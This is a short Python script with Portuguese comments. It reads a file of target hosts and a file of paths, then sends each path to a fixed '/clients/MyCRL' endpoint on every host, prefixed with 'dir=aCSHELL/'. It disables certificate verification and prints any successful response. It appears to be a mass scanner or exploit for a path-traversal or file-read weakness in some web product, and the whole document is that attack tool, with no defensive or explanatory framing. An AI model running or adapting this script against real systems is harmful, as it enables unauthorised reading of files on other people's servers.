import argparse
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, TimeoutError

# Desativar avisos de segurança de certificado
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Sec-Fetch-Dest': 'document',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data_template = {
    "dir": 'aCSHELL/'
}

def read_file(file_path):
    """
    Reads a file and returns its contents as a list of lines.

    Args:
        file_path (str): The path of the file to read.

    Returns:
        list: A list of lines from the file.
    """
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return lines

def make_request(url, path, timeout=10):
    data = data_template.copy()
    data["path"] = path
    payload = data.get('dir') + data.get('path')
    try:
        response = requests.post(f"https://{url}/clients/MyCRL", headers=headers, data=payload, verify=False, timeout=timeout)
        return response, data
    except requests.exceptions.Timeout:
        print(f"Timeout ocorreu para {url}.")
        return None, data
    except requests.exceptions.RequestException as e:
        print(f"Erro ao enviar requisição para {url}: {str(e)}")
        return None, data

def send_post_request(urls_file, paths_file, timeout=10):
    """
    Sends POST requests to the specified URLs with data from each line in a file.

    Args:
        urls_file (str): The file containing the URLs.
        paths_file (str): The file containing the data to be sent.
        timeout (int): Timeout em segundos para cada requisição.

    Returns:
        None
    """
    urls = read_file(urls_file)
    paths = read_file(paths_file)

    for url in urls:
        current_url = url
        for path in paths:
            response, data = make_request(current_url, path, timeout)
            if response is not None:
                if response.status_code == 200:
                    print("----------------------------------------------------------------------------")
                    print(f"Requisição para {response.url} bem-sucedida!")
                    print("Resposta:")
                    print(response.text)
                    print("Payload: " + data.get('path'))
                    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                else:
                    print(f"Requisição para {response.url} falhou com status code: {response.status_code}")
            else:
                # Substituir a URL atual pela próxima da lista
                print("Trocando para a próxima URL...")
                break  # Interromper o loop de paths e ir para a próxima URL

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send POST requests to specified URLs with data from a file.')
    parser.add_argument('-u', '--urls', required=True, help='The file containing the target URLs')
    parser.add_argument('-p', '--paths', required=True, help='The file containing the data to be sent')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout in seconds for each request')

    args = parser.parse_args()
    send_post_request(args.urls, args.paths, args.timeout)
